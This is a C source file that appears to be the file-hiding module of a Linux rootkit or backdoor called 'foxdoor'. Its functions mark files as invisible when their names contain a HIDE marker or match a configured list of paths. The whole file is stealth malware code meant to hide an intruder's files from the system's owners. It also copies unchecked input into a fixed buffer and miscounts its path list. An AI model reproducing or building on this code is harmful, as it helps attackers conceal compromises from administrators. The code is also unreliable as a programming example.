
#include <linux/string.h>
#include <linux/limits.h>

#include "dir.h"
#include "config.h"

int is_name_invisible(const char *filename)
{
	int ret = 0;
    if (strstr(filename, HIDE))
        ret = 1;
	return ret;
}


char *hide_file_paths = NULL;
int hide_file_path_cnt = 0;
int add_hide_file_paths(char *hide_file_paths_str) {

	char *p;
    if(!hide_file_paths)
        hide_file_paths = (char *)malloc(2048);
	debug("foxdoor: hide_file_paths: %s \n", hide_file_paths_str);
    strcpy(hide_file_paths, hide_file_paths_str);
	p = hide_file_paths;
	while (*p) {
		if (*p == ' ') {
			*p = 0;
			hide_file_path_cnt++;
		}
		p++;
	}
	debug("foxdoor: hide_file_path_cnt: %d \n", hide_file_path_cnt);
	return 0;
}

int delete_hide_file_paths() {
	if (hide_file_paths)
		free(hide_file_paths);
	hide_file_paths = NULL;
	hide_file_path_cnt = 0;
	return 0;
}

int is_name_invisible2(const char *filename)
{
	int ret = 0;
	int path_cnt;
	char *p, *q;
	debug("hide_file_paths : %s \n", hide_file_paths);
	p = q = hide_file_paths;
	path_cnt = hide_file_path_cnt;
	while (path_cnt) {
		if (strstr(filename, p)) {
			ret = 1;
			break;
		}
		path_cnt--;
		if (path_cnt <= 0)
			break;
		while (*q != 0)
			q++;
		p = ++q;
	}
	return ret;
}
